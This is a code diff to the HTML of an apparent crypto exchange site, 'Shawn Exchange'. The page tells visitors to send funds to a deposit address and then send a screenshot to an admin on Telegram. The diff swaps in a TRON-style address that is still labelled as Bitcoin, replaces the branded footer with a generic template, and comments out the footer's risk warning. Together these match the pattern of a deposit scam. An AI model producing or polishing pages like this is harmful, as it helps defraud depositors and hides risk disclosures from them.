@@ -532,14 +532,14 @@
                 
                 <!-- Instruction Headline -->
                 <h2 class="text-3xl font-bold text-white mb-6">
-                    Make deposit to this bitcoin address and send your screenshot to the admin on telegram
+                    Make Your Deposit To This Bitcoin Address and Send Screenshot To The Admin on Telegram
                 </h2>
                 
                 <p class="text-gray-400 mb-4">Your personalized deposit address (BTC Network):</p>
                 
                 <!-- Bitcoin Address Box -->
                 <div class="flex flex-col gap-4 mb-8">
-                    <input type="text" id="btc-address" value="bc1qxy2kgjd00eazl6l6n97tpxf24687k2g59v72a" readonly class="w-full p-4 bg-swift-navy border border-swift-gold rounded-lg text-swift-gold font-mono text-lg text-center select-all shadow-lg">
+                    <input type="text" id="btc-address" value="TLiaQMGVTXpoBotKbChet5xZgCFBKgHKAf" readonly class="w-full p-4 bg-swift-navy border border-swift-gold rounded-lg text-swift-gold font-mono text-lg text-center select-all shadow-lg">
                     <button onclick="copyToClipboard('btc-address')" class="w-full py-3 rounded-full bg-swift-gold text-swift-dark font-bold hover:bg-yellow-400 flex items-center justify-center">
                         <i data-lucide="copy" class="w-5 h-5 mr-2"></i> Copy Bitcoin Address
                     </button>
@@ -562,7 +562,66 @@
     </main>
 
     <!-- Footer (Hidden on Dashboard/Deposit) -->
-    <footer id="main-footer" class="bg-swift-dark pt-12 pb-8 border-t border-swift-gold/10">
+
+
+<!-- Footer Section (Only Bootstrap Classes) -->
+    <footer class="bg-dark pt-5 pb-4 mt-auto border-top">
+        <div class="container">
+            <div class="row">
+                
+                <!-- Column 1: Brand Info -->
+                <div class="col-md-4 mb-4 mb-md-0">
+                    <h5 class="fw-bold text-primary mb-3">SiteName</h5>
+                    <p class="text-muted small">
+                        Building the future, one elegant solution at a time.
+                    </p>
+                    <div class="mt-3">
+                        <a href="#" class="text-secondary me-3"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="text-secondary me-3"><i class="fab fa-linkedin"></i></a>
+                        <a href="#" class="text-secondary"><i class="fab fa-github"></i></a>
+                    </div>
+                </div>
+
+                <!-- Column 2: Navigation Links -->
+                <div class="col-md-4 mb-4 mb-md-0">
+                    <h5 class="fw-bold mb-3">Explore</h5>
+                    <ul class="list-unstyled">
+                        <li><a href="#" class="text-muted text-decoration-none">Features</a></li>
+                        <li><a href="#" class="text-muted text-decoration-none">Pricing</a></li>
+                        <li><a href="#" class="text-muted text-decoration-none">Careers</a></li>
+                        <li><a href="#" class="text-muted text-decoration-none">Support</a></li>
+                    </ul>
+                </div>
+
+                <!-- Column 3: Newsletter Signup -->
+                <div class="col-md-4">
+                    <h5 class="fw-bold mb-3">Newsletter</h5>
+                    <p class="text-muted small">Get the latest news directly in your inbox.</p>
+                    <form class="d-flex">
+                        <input type="email" class="form-control form-control-sm me-2" placeholder="Email address" aria-label="Email address">
+                        <button class="btn btn-primary btn-sm" type="submit">Sign Up</button>
+                    </form>
+                </div>
+
+            </div>
+
+            <!-- Copyright and Legal Links -->
+            <div class="row pt-4 mt-4 border-top">
+                <div class="col-12 text-center text-md-start d-flex justify-content-between flex-column flex-md-row">
+                    <p class="mb-2 mb-md-0 text-muted small">&copy; 2024 SiteName. All rights reserved.</p>
+                    <div class="small">
+                        <a href="#" class="text-muted text-decoration-none me-3">Privacy Policy</a>
+                        <a href="#" class="text-muted text-decoration-none">Terms of Use</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+
+
+    
+    <!-- <footer id="main-footer" class="bg-swift-dark pt-12 pb-8 border-t border-swift-gold/10">
         <div class="container mx-auto px-4 text-center text-xs text-gray-600">
             <p class="font-bold text-red-500 mb-2">RISK WARNING</p>
             <p class="max-w-4xl mx-auto">
@@ -570,7 +629,7 @@
             </p>
             <p class="mt-4">&copy; 2023 Shawn Exchange. All rights reserved.</p>
         </div>
-    </footer>
+    </footer> -->
 
     <!-- ////////////////////////////////////////////////////////////////////////////////////////// -->
 
